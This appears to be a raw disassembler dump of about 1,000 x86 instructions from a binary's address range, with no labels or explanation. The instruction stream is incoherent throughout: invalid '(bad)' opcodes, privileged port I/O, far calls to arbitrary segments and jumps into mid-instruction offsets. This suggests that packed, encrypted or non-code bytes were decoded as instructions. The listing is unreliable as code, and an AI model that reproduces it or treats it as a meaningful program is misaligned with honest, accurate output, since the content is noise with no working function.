  4029d0:	jmp    0x7a7b:0x51b39a92
  4029d7:	mov    dh,0xf6
  4029d9:	loopne 0x40298c
  4029db:	jbe    0x402a26
  4029dd:	jmp    DWORD PTR [esp+edx*2+0x28]
  4029e1:	popf   
  4029e2:	ins    BYTE PTR es:[edi],dx
  4029e3:	inc    esi
  4029e4:	repnz xchg edi,eax
  4029e6:	push   ebp
  4029e7:	jnp    0x402a3c
  4029e9:	jg     0x4029cd
  4029eb:	sub    ch,BYTE PTR [esi]
  4029ed:	and    esp,ecx
  4029ef:	aas    
  4029f0:	pop    ds
  4029f1:	jmp    0x420e44eb
  4029f6:	sbb    BYTE PTR [ebp-0x69a5008b],bh
  4029fc:	mov    esp,0xaaaafd7c
  402a01:	push   ss
  402a02:	mov    ss,WORD PTR [eax+0x3f]
  402a05:	jo     0x4029bc
  402a07:	loopne 0x402993
  402a09:	fcmovu st,st(5)
  402a0b:	or     ah,BYTE PTR [ecx+0x66]
  402a0e:	xchg   ebp,eax
  402a0f:	arpl   WORD PTR [ecx],di
  402a11:	sbb    BYTE PTR [ebx+0x40],al
  402a14:	xlat   BYTE PTR ds:[ebx]
  402a15:	test   BYTE PTR [edi-0x78],al
  402a18:	cli    
  402a19:	dec    eax
  402a1a:	aas    
  402a1b:	(bad)  
  402a1d:	fisubr WORD PTR [eax+edx*4+0x2d]
  402a21:	add    al,0x5c
  402a23:	push   ds
  402a24:	jne    0x402a18
  402a26:	jp     0x4029ee
  402a28:	into   
  402a29:	add    edi,ecx
  402a2b:	sub    al,0x7b
  402a2d:	xor    bl,ch
  402a2f:	sbb    al,0x61
  402a32:	mov    dl,0x78
  402a34:	inc    DWORD PTR [edi]
  402a36:	add    ah,BYTE PTR [esi+0x202539dd]
  402a3c:	ret    0xd7f3
  402a3f:	pushf  
  402a40:	std    
  402a41:	pusha  
  402a42:	mov    fs,WORD PTR ds:[edx]
  402a45:	ror    DWORD PTR [ecx+ebx*4],1
  402a48:	xchg   edi,eax
  402a49:	mov    esp,0xea41794f
  402a4e:	and    al,0xd1
  402a50:	mov    dl,0xb3
  402a52:	adc    al,0x53
  402a54:	int3   
  402a55:	(bad)  
  402a56:	mov    ds:0xe27831f,al
  402a5b:	ja     0x402ada
  402a5d:	loope  0x4029ed
  402a5f:	or     eax,eax
  402a61:	xchg   ebp,eax
  402a62:	push   ds
  402a63:	lahf   
  402a64:	mov    esp,0x4d21b015
  402a69:	mov    eax,0x8003e8e0
  402a6e:	mov    ds:0x8fcac637,eax
  402a73:	mov    DWORD PTR [ecx],edi
  402a75:	sbb    bl,BYTE PTR [esi+0x2f]
  402a78:	mov    ds:0xd1288d4f,al
  402a7d:	cdq    
  402a7e:	add    esi,DWORD PTR [eax-0x60126026]
  402a84:	mov    cl,0x7
  402a86:	lahf   
  402a87:	dec    ebp
  402a88:	mov    esi,0x39898c40
  402a8d:	jae    0x402a2b
  402a8f:	add    ah,BYTE PTR [ebx-0xd]
  402a92:	xchg   BYTE PTR [esp+ebx*4-0x430fd058],cl
  402a99:	scas   al,BYTE PTR es:[edi]
  402a9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a9b:	rcr    BYTE PTR [ebp-0x7b],0xaa
  402a9f:	imul   esi,DWORD PTR [ebx+0x192f9504],0x6b
  402aa6:	xlat   BYTE PTR ds:[ebx]
  402aa7:	mov    edi,0xbe89187e
  402aac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402aad:	rcl    BYTE PTR [edi+0x28],0xfe
  402ab1:	dec    esi
  402ab2:	xchg   DWORD PTR [eax-0x43],esi
  402ab5:	aad    0xcb
  402ab7:	loopne 0x402adb
  402ab9:	dec    esi
  402aba:	inc    ebx
  402abb:	ror    BYTE PTR [ecx+ebp*1],cl
  402abe:	sbb    DWORD PTR [edx-0x16decb25],0xffffff9b
  402ac5:	push   0xffffffd3
  402ac7:	inc    edi
  402ac8:	test   eax,0xa601d524
  402acd:	cmp    al,0xe
  402acf:	dec    ecx
  402ad0:	jg     0x402ad8
  402ad2:	shr    BYTE PTR [ecx+0x55],0xe0
  402ad6:	scas   eax,DWORD PTR es:[edi]
  402ad7:	mov    ch,0x4
  402ad9:	jmp    0x402a80
  402adb:	and    BYTE PTR [eax+edx*4],cl
  402ade:	je     0x402aac
  402ae0:	mov    ds:0x5e6b02d8,eax
  402ae5:	push   0x90987ed1
  402aea:	xor    esi,ebp
  402aec:	cmp    DWORD PTR [ebx],edi
  402aee:	aam    0x4f
  402af0:	inc    edx
  402af1:	fxch   st(5)
  402af3:	add    eax,esp
  402af5:	sub    bh,ch
  402af7:	mov    cl,0x3f
  402af9:	sahf   
  402afa:	in     eax,dx
  402afb:	loope  0x402ae4
  402afd:	ds pop ebp
  402aff:	ds jae 0x402b6e
  402b02:	les    ebx,FWORD PTR gs:[edi-0x52]
  402b06:	pop    es
  402b07:	ret    
  402b08:	call   0x1f83:0x60098577
  402b0f:	mov    al,0xad
  402b11:	inc    edx
  402b12:	test   al,0x4d
  402b14:	out    0xc0,eax
  402b16:	xor    eax,0x6f90b372
  402b1b:	jbe    0x402b47
  402b1d:	shl    DWORD PTR [edi-0x35],0xad
  402b21:	div    DWORD PTR [ebx]
  402b23:	shl    DWORD PTR [ebx+0x27],1
  402b26:	int    0x3c
  402b28:	or     al,dh
  402b2a:	xor    DWORD PTR [eax-0x2e],esp
  402b2d:	mov    al,ds:0xe9c7e96
  402b32:	dec    bh
  402b34:	mov    bh,0x23
  402b36:	in     al,0x48
  402b38:	arpl   cx,bx
  402b3a:	retf   0xaff5
  402b3d:	daa    
  402b3e:	mov    esi,0x2bf921c6
  402b43:	stc    
  402b44:	test   BYTE PTR [ecx+0x3c],dl
  402b47:	adc    BYTE PTR [eax+0x5c0bd971],bh
  402b4d:	pop    esp
  402b4e:	sub    ecx,esp
  402b50:	mov    al,0x34
  402b52:	call   0xd1c0:0x4f9bfec5
  402b59:	jmp    0x402b61
  402b5b:	arpl   WORD PTR [ebp+0x1f4b5697],bx
  402b61:	ins    DWORD PTR es:[edi],dx
  402b62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b63:	inc    edx
  402b64:	and    eax,0xa09671f
  402b69:	daa    
  402b6a:	into   
  402b6b:	mov    esp,?
  402b6d:	cdq    
  402b6e:	test   eax,0x9a85462f
  402b73:	xor    DWORD PTR [edi-0x7e1826d2],0x83795005
  402b7d:	(bad)  
  402b7e:	pop    eax
  402b7f:	push   esp
  402b80:	add    ch,BYTE PTR ds:0xde417f52
  402b86:	xchg   BYTE PTR [ebx],bh
  402b88:	push   edi
  402b89:	dec    ecx
  402b8a:	mov    bl,0xcb
  402b8c:	call   0xa0a9:0x58520a6b
  402b93:	dec    ecx
  402b94:	std    
  402b95:	inc    eax
  402b96:	inc    esp
  402b97:	shrd   esi,esi,0x95
  402b9b:	push   ebx
  402b9c:	cmp    BYTE PTR [edx-0x49],dl
  402b9f:	jno    0x402c1b
  402ba1:	icebp  
  402ba2:	addr16 inc ecx
  402ba4:	out    0x9d,eax
  402ba6:	fidiv  WORD PTR [ebp-0x2a]
  402ba9:	rcr    ah,cl
  402bab:	ins    DWORD PTR es:[edi],dx
  402bac:	out    0x59,eax
  402bae:	int    0x29
  402bb0:	scas   al,BYTE PTR es:[edi]
  402bb1:	mov    eax,0xaa98ac45
  402bb6:	xor    BYTE PTR [eax+0x51e7fcd],cl
  402bbc:	or     ebx,edi
  402bbe:	push   ss
  402bbf:	mov    ch,0x68
  402bc1:	xchg   edi,eax
  402bc2:	push   ss
  402bc3:	aam    0x96
  402bc5:	mov    cl,0xfb
  402bc7:	in     al,0x24
  402bc9:	rol    bl,0x4f
  402bcc:	stos   BYTE PTR es:[edi],al
  402bcd:	call   0xef0b:0x689683b0
  402bd4:	or     dh,0xe1
  402bd7:	jno    0x402b94
  402bd9:	fbstp  TBYTE PTR [ecx+0x7df7b846]
  402bdf:	mov    ebx,DWORD PTR [esi+0x4710cc57]
  402be5:	gs add al,0x87
  402be8:	into   
  402be9:	inc    ebp
  402bea:	pop    ecx
  402beb:	ja     0x402bc4
  402bed:	in     eax,0xd4
  402bef:	arpl   WORD PTR [ebx],bp
  402bf1:	jns    0x402baf
  402bf3:	rol    DWORD PTR [esp+edx*8-0x78b0ff0c],cl
  402bfa:	pop    ecx
  402bfb:	icebp  
  402bfc:	test   BYTE PTR [ecx+ebp*8+0x19],bh
  402c00:	push   esp
  402c01:	xchg   esp,eax
  402c02:	or     edi,DWORD PTR [edi+edx*8+0x715bce55]
  402c09:	inc    eax
  402c0a:	inc    ebp
  402c0b:	rol    esp,1
  402c0d:	or     bl,BYTE PTR [ebx-0x49]
  402c10:	(bad)  
  402c12:	retf   0x9c80
  402c15:	mov    bh,bh
  402c17:	mov    cs,WORD PTR [ecx+esi*2-0xf]
  402c1b:	inc    esp
  402c1c:	repz in al,0xe8
  402c1f:	fmul   DWORD PTR [ecx+edx*4+0x2c]
  402c23:	(bad)  
  402c24:	iret   
  402c25:	ins    BYTE PTR es:[edi],dx
  402c26:	jecxz  0x402bd0
  402c28:	pop    ss
  402c29:	mov    dh,0xe1
  402c2b:	test   al,0xa5
  402c2d:	scas   al,BYTE PTR es:[edi]
  402c2e:	fsubr  DWORD PTR [ecx+0x5d]
  402c31:	inc    DWORD PTR [esi]
  402c33:	fwait
  402c34:	pop    edx
  402c35:	fidiv  WORD PTR [eax+0x6c]
  402c38:	and    eax,0xb193f4ea
  402c3d:	lock mov dh,BYTE PTR ds:0x924f6272
  402c44:	mov    DWORD PTR [ebx-0x58],esi
  402c47:	test   al,0xad
  402c49:	addr16 xor ch,dh
  402c4c:	mov    bh,0x3b
  402c4e:	push   edi
  402c4f:	sbb    ah,BYTE PTR [ebp+0x5a9d522e]
  402c55:	int    0x84
  402c57:	jl     0x402c1a
  402c59:	ss push esi
  402c5b:	(bad)  
  402c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c5d:	in     al,0xb8
  402c5f:	mov    al,0x93
  402c61:	sbb    eax,0xe6e79a4e
  402c66:	popa   
  402c67:	ins    BYTE PTR es:[edi],dx
  402c68:	scas   al,BYTE PTR es:[edi]
  402c69:	cmc    
  402c6a:	cld    
  402c6b:	jo     0x402bfd
  402c6d:	xchg   esp,eax
  402c6e:	icebp  
  402c6f:	xor    DWORD PTR [ebx+ecx*2+0x69f251aa],edx
  402c76:	(bad)  
  402c77:	stc    
  402c78:	test   al,bl
  402c7a:	sbb    esp,DWORD PTR [edx]
  402c7c:	fwait
  402c7d:	out    dx,eax
  402c7e:	and    ebx,DWORD PTR [eax-0x2592a857]
  402c84:	aaa    
  402c85:	adc    BYTE PTR [edx+0x615ad618],dl
  402c8b:	mov    DWORD PTR [esi-0x576cef0b],eax
  402c91:	inc    eax
  402c92:	or     al,0x4
  402c94:	call   0x9c020434
  402c99:	pop    edi
  402c9a:	pop    ds
  402c9b:	(bad)  
  402c9c:	repnz aam 0x19
  402c9f:	fisttp DWORD PTR [eax]
  402ca1:	jo     0x402cb6
  402ca3:	sbb    edi,ebx
  402ca5:	retf   
  402ca6:	jmp    0xc277:0x5cb45ab3
  402cad:	les    eax,FWORD PTR [eax-0x32]
  402cb0:	in     eax,dx
  402cb1:	or     BYTE PTR [eax+0x159b157],0x95
  402cb8:	aas    
  402cb9:	fwait
  402cba:	xor    ebx,edi
  402cbc:	out    0x54,eax
  402cbe:	push   eax
  402cbf:	std    
  402cc0:	mov    esi,0x15b65f47
  402cc5:	(bad)  
  402cc6:	call   0xe610:0x629fc959
  402ccd:	inc    ebx
  402cce:	adc    BYTE PTR [bx+di-0x6],bh
  402cd2:	pop    ebx
  402cd3:	pop    esp
  402cd4:	xchg   ebp,eax
  402cd5:	ss pop edx
  402cd7:	jne    0x402ce3
  402cd9:	and    esp,DWORD PTR [eax-0x6c3356e6]
  402cdf:	adc    ebx,DWORD PTR [ebx+0x3a6e6343]
  402ce5:	mov    dl,0x28
  402ce7:	jp     0x402d5e
  402ce9:	rcl    al,cl
  402ceb:	xchg   BYTE PTR [esi],dl
  402ced:	xlat   BYTE PTR ds:[ebx]
  402cee:	aam    0x30
  402cf0:	rcr    ebp,cl
  402cf2:	sub    edi,DWORD PTR [ebx+eax*8-0x72]
  402cf6:	and    edx,edx
  402cf8:	js     0x402ca9
  402cfa:	gs push ebx
  402cfc:	ins    DWORD PTR es:[edi],dx
  402cfd:	xlat   BYTE PTR ds:[ebx]
  402cfe:	int    0xa7
  402d00:	in     eax,dx
  402d01:	test   esi,ecx
  402d03:	ds xchg ebx,eax
  402d05:	adc    dl,BYTE PTR [ebp-0xec97013]
  402d0b:	dec    edx
  402d0c:	je     0x402d3e
  402d0e:	push   cs
  402d0f:	shr    DWORD PTR [ecx+eax*8+0x5b],0xd9
  402d14:	scas   eax,DWORD PTR es:[edi]
  402d15:	bndldx (bad),[ecx-0x1409f5a4]
  402d1c:	retf   0xc417
  402d1f:	rol    BYTE PTR [ecx-0x52],0x7b
  402d23:	dec    eax
  402d24:	push   es
  402d25:	mov    ah,0xc5
  402d27:	xchg   DWORD PTR [edx-0x6ebd5983],edi
  402d2d:	cmp    bl,bl
  402d2f:	rcr    DWORD PTR [eax],1
  402d31:	cmp    eax,0x29d84a2e
  402d36:	mov    ecx,0xe041ba2c
  402d3b:	je     0x402da7
  402d3d:	xor    bl,dl
  402d3f:	sti    
  402d40:	mov    ds:0xc628f341,al
  402d45:	cmp    BYTE PTR [edi],0x75
  402d48:	std    
  402d49:	xor    eax,0xedc9b826
  402d4e:	ud1    ebx,DWORD PTR [edi]
  402d51:	jge    0x402d0a
  402d53:	mov    cl,0x43
  402d55:	xor    edi,0x2ba9120
  402d5b:	popf   
  402d5c:	imul   edx,edx,0x8dbc7f11
  402d62:	test   al,0xa8
  402d64:	fdivr  DWORD PTR [edi+0x41]
  402d67:	xchg   DWORD PTR [ecx-0x72bd12d4],ecx
  402d6d:	mov    BYTE PTR [eax-0x2b],0x12
  402d71:	rol    DWORD PTR [edx+eiz*8],0x6c
  402d75:	mov    eax,ds:0xe5d69a18
  402d7a:	adc    ecx,DWORD PTR [edx+edi*4-0x295f25a8]
  402d81:	xor    eax,DWORD PTR [ecx-0x61]
  402d84:	xchg   esi,eax
  402d85:	jg     0x402dc5
  402d87:	mov    gs,WORD PTR [edi+0x54]
  402d8a:	mov    esp,0xc50c36f0
  402d8f:	mov    bh,0x5d
  402d91:	inc    ebp
  402d92:	pop    ss
  402d93:	jnp    0x402ded
  402d95:	jmp    0x402dbd
  402d97:	jmp    0xfaed3f41
  402d9c:	daa    
  402d9d:	pop    eax
  402d9e:	arpl   WORD PTR [ecx-0x67],sp
  402da1:	xor    eax,0x483d2d7
  402da6:	sbb    edx,DWORD PTR [edi-0x43]
  402da9:	clc    
  402daa:	inc    ebx
  402dab:	test   eax,0x2a6e85f0
  402db0:	or     cl,BYTE PTR [esp+ebx*1+0x69]
  402db4:	push   esi
  402db5:	arpl   WORD PTR [eax],si
  402db7:	sbb    eax,0x50a21c3e
  402dbc:	push   es
  402dbd:	aad    0x99
  402dbf:	outs   dx,BYTE PTR ds:[esi]
  402dc0:	data16 std 
  402dc2:	das    
  402dc3:	out    0xf0,al
  402dc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dc6:	cmp    eax,0x42e974c4
  402dcb:	sbb    ebp,DWORD PTR [ebx-0x443ecf4]
  402dd1:	ret    0x410e
  402dd4:	xchg   edx,eax
  402dd5:	clc    
  402dd6:	sbb    al,0xa3
  402dd8:	xlat   BYTE PTR ds:[ebx]
  402dd9:	mov    bh,0xae
  402ddb:	inc    esp
  402ddc:	fcom   QWORD PTR [eax-0x64e2bc3a]
  402de2:	cli    
  402de3:	pop    ebx
  402de4:	sar    BYTE PTR [ecx-0x17961861],0x3d
  402deb:	aad    0xd6
  402ded:	pop    esi
  402dee:	mov    esp,0xd1d4af3d
  402df3:	lea    edx,[esi]
  402df5:	mov    ecx,0xf6b949f4
  402dfa:	jo     0x402d84
  402dfc:	bound  edi,QWORD PTR [eax+eiz*4]
  402dff:	jp     0x402e51
  402e01:	lods   al,BYTE PTR ds:[esi]
  402e02:	sbb    edi,DWORD PTR [ebx+0x4a]
  402e05:	inc    ecx
  402e06:	jmp    0xb95f9ba6
  402e0b:	sbb    al,0xa7
  402e0d:	xor    DWORD PTR [si+0x7740],ecx
  402e12:	push   ss
  402e13:	mov    ch,0x69
  402e15:	inc    edi
  402e16:	sbb    bl,BYTE PTR [esi+0x43]
  402e19:	mov    ebx,0xd35e0c6f
  402e1e:	aaa    
  402e1f:	xor    al,0x2e
  402e21:	pop    es
  402e22:	xor    ebp,DWORD PTR [edi]
  402e24:	dec    ebp
  402e25:	and    al,0x87
  402e27:	push   ds
  402e28:	popf   
  402e29:	or     edx,edi
  402e2b:	mov    cs,WORD PTR [ebp-0x5e8310df]
  402e31:	rcl    BYTE PTR [ecx-0x25],1
  402e34:	cmp    eax,0xcb6a1cc5
  402e39:	cld    
  402e3a:	arpl   WORD PTR [ebx+0x61ec4ea8],cx
  402e40:	(bad)  
  402e41:	pop    esp
  402e42:	cmp    eax,0xda2b624d
  402e47:	(bad)  
  402e49:	cmp    BYTE PTR [ecx+edi*4],al
  402e4c:	(bad)  
  402e4d:	icebp  
  402e4e:	inc    ebp
  402e4f:	push   esp
  402e50:	mov    ecx,0x8f38bad6
  402e55:	ins    DWORD PTR es:[edi],dx
  402e56:	bound  esp,QWORD PTR [esi]
  402e58:	adc    eax,0xa32afcf7
  402e5d:	stc    
  402e5e:	addr16 dec ecx
  402e60:	fisttp WORD PTR [ecx-0x3b]
  402e63:	add    al,0x7f
  402e65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e66:	ror    ebx,1
  402e68:	bound  ebx,QWORD PTR [edi-0x53]
  402e6b:	sbb    ebx,ebp
  402e6d:	bound  esi,QWORD PTR [ebx+ebp*8]
  402e70:	pop    ebx
  402e71:	mov    eax,ds:0x997ce9f8
  402e76:	leave  
  402e77:	call   0x67a4a1a9
  402e7c:	cmp    ecx,DWORD PTR [eax]
  402e7e:	scas   al,BYTE PTR es:[edi]
  402e7f:	xchg   esi,eax
  402e80:	push   ecx
  402e81:	retf   0x3deb
  402e84:	pop    esp
  402e85:	or     al,0x3f
  402e87:	jbe    0x402e12
  402e89:	call   0xac21:0xc8ffdb5b
  402e90:	inc    esi
  402e91:	outs   dx,DWORD PTR ds:[esi]
  402e92:	dec    eax
  402e93:	out    0xc0,al
  402e95:	gs sub al,cl
  402e98:	jmp    0x12c4df8a
  402e9d:	add    BYTE PTR [eax],bh
  402e9f:	cs pop ds
  402ea1:	or     di,0xffb0
  402ea5:	sti    
  402ea6:	pop    edx
  402ea7:	pop    edx
  402ea8:	std    
  402ea9:	(bad)  
  402eaa:	mov    ecx,0x70502481
  402eaf:	fstp   TBYTE PTR [edx]
  402eb1:	xchg   DWORD PTR [ebp+0x51d095f3],ecx
  402eb7:	sbb    eax,edi
  402eb9:	and    edx,DWORD PTR [eax+0x6e]
  402ebc:	scas   eax,DWORD PTR es:[edi]
  402ebd:	and    ebx,ebx
  402ebf:	sub    ebx,ebx
  402ec1:	(bad)  
  402ec2:	nop
  402ec3:	enter  0x346d,0x9e
  402ec7:	sub    ebp,DWORD PTR [esi+0x28f687cc]
  402ecd:	sbb    ch,BYTE PTR [esi+0x61]
  402ed0:	gs jp  0x402e5e
  402ed3:	push   cs
  402ed4:	shl    DWORD PTR [edx+eiz*2],0x1e
  402ed8:	xchg   esp,eax
  402ed9:	loop   0x402e85
  402edb:	dec    ebx
  402edc:	or     edx,DWORD PTR [ecx]
  402ede:	and    al,0xa
  402ee0:	psraw  mm2,mm5
  402ee3:	rcl    bl,0x9b
  402ee6:	pop    ecx
  402ee7:	jno    0x402f31
  402ee9:	push   0x61
  402eeb:	jbe    0x402efd
  402eed:	mov    esi,0x45ed3846
  402ef2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ef3:	aaa    
  402ef4:	cmp    dl,bh
  402ef6:	xor    ch,BYTE PTR [ebx+0x0]
  402ef9:	scas   al,BYTE PTR es:[edi]
  402efa:	push   edi
  402efb:	push   0x90ed95c1
  402f00:	pop    eax
  402f01:	(bad)  
  402f02:	mov    esi,0x9ae6e5a1
  402f07:	pop    esi
  402f08:	xlat   BYTE PTR ds:[ebx]
  402f09:	xor    DWORD PTR [ecx],ebp
  402f0b:	adc    DWORD PTR [ebx+eax*1+0x463e3ff6],esi
  402f12:	or     edx,esi
  402f14:	dec    edx
  402f15:	idiv   DWORD PTR [esi]
  402f17:	push   es
  402f18:	jnp    0x402ebb
  402f1a:	fbld   TBYTE PTR [ebx+0x3c]
  402f1d:	cmp    BYTE PTR [ebp-0x69b4e1bf],0xa1
  402f24:	adc    eax,0x1bb2fa14
  402f29:	and    al,0x91
  402f2b:	add    ebx,DWORD PTR [edx+0x4b44a022]
  402f31:	inc    ebp
  402f32:	outs   dx,BYTE PTR ds:[esi]
  402f33:	jle    0x402f53
  402f35:	mov    dl,BYTE PTR [ebp-0x75]
  402f38:	xchg   esi,eax
  402f39:	retf   0x2f06
  402f3c:	daa    
  402f3d:	cmp    al,0x43
  402f3f:	arpl   WORD PTR [ebp+0x4e1f7294],bx
  402f45:	(bad)  
  402f46:	(bad)  
  402f47:	mov    bh,BYTE PTR [ebx-0x379dec43]
  402f4d:	push   eax
  402f4e:	cld    
  402f4f:	push   ss
  402f50:	push   0x77cea294
  402f55:	mov    esi,DWORD PTR [esi+0x51]
  402f58:	fnstenv [eax+0x47]
  402f5b:	push   ebp
  402f5c:	push   ecx
  402f5d:	pop    eax
  402f5e:	ficom  WORD PTR [esi]
  402f60:	in     al,dx
  402f61:	pop    edx
  402f62:	shl    BYTE PTR [edi-0x78],1
  402f65:	test   BYTE PTR [ecx+0x7f],al
  402f68:	ds jg  0x402f14
  402f6b:	adc    esi,DWORD PTR [eax]
  402f6d:	fld    DWORD PTR [ebx+0x6d]
  402f70:	xor    BYTE PTR [ebp+0x20],0x2c
  402f74:	std    
  402f75:	cdq    
  402f76:	xrelease mov DWORD PTR [edx],ebx
  402f79:	and    al,bh
  402f7b:	icebp  
  402f7c:	shl    ebx,0x99
  402f7f:	push   ebp
  402f80:	jbe    0x402fb6
  402f82:	dec    eax
  402f83:	rol    DWORD PTR [ebx+ebx*2],cl
  402f86:	outs   dx,DWORD PTR ds:[esi]
  402f87:	push   ebp
  402f88:	dec    ebx
  402f89:	jmp    0x402fec
  402f8b:	jp     0x402f45
  402f8d:	out    dx,eax
  402f8e:	inc    edx
  402f8f:	xor    ecx,DWORD PTR [ebx+0x5d]
  402f92:	sahf   
  402f93:	pop    es
  402f94:	or     al,0xf9
  402f96:	test   BYTE PTR [esi+0x6d743097],al
  402f9c:	dec    esp
  402f9d:	repz repnz adc al,0x1d
  402fa1:	cwde   
  402fa2:	cs iret 
  402fa4:	mov    al,0xa9
  402fa6:	adc    cl,BYTE PTR [edx+0x6b]
  402fa9:	xchg   ebp,eax
  402faa:	mov    eax,0x4258baa8
  402faf:	push   edx
  402fb0:	sahf   
  402fb1:	out    0x68,eax
  402fb3:	xchg   ecx,eax
  402fb4:	rcl    DWORD PTR [ecx+0x55],cl
  402fb7:	push   ds
  402fb8:	nop
  402fb9:	xchg   edi,eax
  402fba:	xor    edx,DWORD PTR [ebx-0x32]
  402fbd:	mov    edi,0xb622836a
  402fc2:	data16 aaa 
  402fc4:	adc    al,0xc9
  402fc6:	push   ebp
  402fc7:	and    ebp,DWORD PTR [edx-0x7e98876e]
  402fcd:	push   0xd5934394
  402fd2:	std    
  402fd3:	add    DWORD PTR [eax+ebp*1-0x3e3c2612],edx
  402fda:	loop   0x40304d
  402fdc:	jmp    0x37bc:0xe06eb6b1
  402fe3:	push   es
  402fe4:	xchg   BYTE PTR [ecx],cl
  402fe6:	in     eax,dx
  402fe7:	lahf   
  402fe8:	setne  BYTE PTR [eax+0x24fa01e9]
  402fef:	add    DWORD PTR [edx+0x13],eax
  402ff2:	mov    ds:0x5f15a6ef,eax
  402ff7:	adc    eax,ecx
  402ff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ffa:	dec    esi
  402ffb:	ret    
  402ffc:	xchg   ecx,eax
  402ffd:	mov    ds:0xe315604e,al
  403002:	lds    edx,FWORD PTR [edi+0x7b]
  403005:	cmp    BYTE PTR [esi-0x64fa4ce6],dh
  40300b:	ja     0x402f98
  40300d:	and    dl,al
  40300f:	mov    ah,0xa6
  403011:	int3   
  403012:	in     eax,dx
  403013:	push   ebx
  403014:	push   ecx
  403015:	loopne 0x40304f
  403017:	sub    cl,al
  403019:	stos   DWORD PTR es:[edi],eax
  40301a:	loop   0x40301f
  40301c:	retf   0x33d7
  40301f:	mov    edi,0xe497fbdb
  403024:	std    
  403025:	push   esp
  403026:	sbb    al,0x11
  403028:	push   ebp
  403029:	in     eax,0x2e
  40302b:	stos   DWORD PTR es:[edi],eax
  40302c:	test   eax,0x24e2fc48
  403031:	shl    BYTE PTR [esi+0xfb57bf2],cl
  403037:	fild   DWORD PTR [eax]
  403039:	int    0xc0
  40303b:	ret    0x82b
  40303e:	inc    ecx
  40303f:	das    
  403040:	pop    eax
  403041:	sub    DWORD PTR [edi+0x28],0x99bd7b36
  403048:	xchg   ecx,eax
  403049:	add    ebp,DWORD PTR [esi-0x67b1a149]
  40304f:	cmc    
  403050:	(bad)  
  403051:	or     BYTE PTR [edi],bl
  403053:	lock in al,dx
  403055:	push   esp
  403056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403057:	xchg   edi,eax
  403058:	shl    ah,1
  40305a:	push   es
  40305b:	mov    eax,0x6556f6d7
  403060:	mov    dl,0x4f
  403062:	sti    
  403063:	jb     0x4030a8
  403065:	scas   eax,DWORD PTR es:[edi]
  403066:	jl     0x4030ad
  403068:	test   cl,bh
  40306a:	dec    edx
  40306b:	sbb    DWORD PTR [ebx+0x451b1466],edi
  403071:	mov    ch,bl
  403073:	xchg   esi,eax
  403074:	loop   0x403022
  403076:	rcr    DWORD PTR [edx],cl
  403078:	and    eax,0xda648e9b
  40307d:	and    BYTE PTR [ecx],ah
  40307f:	or     ebp,eax
  403081:	push   ebp
  403082:	ror    BYTE PTR [esi+0x47],0xa7
  403086:	stc    
  403087:	stos   BYTE PTR es:[edi],al
  403088:	cmp    eax,DWORD PTR [edx]
  40308a:	jo     0x4030a6
  40308c:	(bad)  
  40308d:	sbb    al,0x54
  40308f:	or     bh,BYTE PTR [eax+0x593b7298]
  403095:	adc    esp,0xcc4a235
  40309b:	test   DWORD PTR [ebx],ebx
  40309d:	fistp  DWORD PTR [eax]
  40309f:	sbb    cl,dh
  4030a1:	inc    esi
  4030a2:	cs gs daa 
  4030a5:	push   esi
  4030a6:	gs pop ecx
  4030a8:	imul   ebx,edx,0xffc625bc
  4030ae:	(bad)  
  4030af:	adc    eax,ebp
  4030b1:	dec    edi
  4030b2:	stc    
  4030b3:	pushf  
  4030b4:	inc    ebx
  4030b5:	sub    eax,0x7f3d5f04
  4030ba:	lock icebp 
  4030bc:	sar    bl,1
  4030be:	lahf   
  4030bf:	icebp  
  4030c0:	and    eax,esi
  4030c2:	mov    esp,0x9ecf175a
  4030c7:	cdq    
  4030c8:	data16 shl dh,cl
  4030cb:	jmp    0x4030e2
  4030cd:	mov    ecx,0x3472882e
  4030d2:	in     eax,dx
  4030d3:	ss jp  0x4030e8
  4030d6:	pop    ds
  4030d7:	cmp    cl,BYTE PTR [eax]
  4030d9:	add    dl,al
  4030db:	jmp    0x4030f1
  4030dd:	dec    edx
  4030de:	or     al,BYTE PTR [ecx-0x20]
  4030e1:	mov    ch,bl
  4030e3:	inc    ecx
  4030e4:	add    esi,0xfffffffa
  4030e7:	in     eax,0xdb
  4030e9:	dec    BYTE PTR [eax+0x56dd1960]
  4030ef:	pushf  
  4030f0:	xlat   BYTE PTR ds:[ebx]
  4030f1:	adc    DWORD PTR [edx-0x508206eb],0x5f
  4030f8:	dec    edx
  4030f9:	outs   dx,BYTE PTR ds:[esi]
  4030fa:	in     al,dx
  4030fb:	and    al,0xce
  4030fd:	shl    ch,cl
  4030ff:	push   esp
  403100:	push   edx
  403101:	test   BYTE PTR [esi-0x236ecde0],dl
  403107:	inc    BYTE PTR [ecx]
  403109:	and    eax,0x6f38a7f3
  40310e:	cli    
  40310f:	xor    ch,ch
  403111:	lea    ecx,[esp+esi*1-0x61]
  403115:	mov    esp,0x29cc476c
  40311a:	jbe    0x403153
  40311c:	xor    DWORD PTR [ebx+eax*8-0x6b],0x17
  403121:	or     dl,BYTE PTR [ecx+0x5]
  403124:	and    al,dh
  403126:	int    0xf5
  403128:	adc    dh,ah
  40312a:	adc    dh,ah
  40312c:	mov    ch,0xb7
  40312e:	adc    al,dh
  403130:	mov    esi,0x2a605649
  403135:	pop    esp
  403136:	push   0xffffffb7
  403138:	inc    edx
  403139:	xchg   esi,eax
  40313a:	and    eax,0x94d7e233
  40313f:	outs   dx,BYTE PTR ds:[esi]
  403140:	es cli 
  403142:	push   ecx
  403143:	jmp    0x4031c3
  403145:	dec    esi
  403146:	fstp   QWORD PTR [ebx-0x398e3e50]
  40314c:	fsub   QWORD PTR [eax-0x50c69f21]
  403152:	mov    ah,0xbb
  403154:	ret    0x846d
  403157:	sbb    DWORD PTR [ebx+0x67],esi
  40315a:	in     al,dx
  40315b:	sub    edx,DWORD PTR [edx]
  40315d:	das    
  40315e:	shl    dl,cl
  403160:	dec    esi
  403161:	push   ecx
  403162:	out    0xa7,eax
  403164:	xchg   ebp,eax
  403165:	and    al,0x7c
  403167:	lods   eax,DWORD PTR ds:[esi]
  403168:	scas   al,BYTE PTR es:[edi]
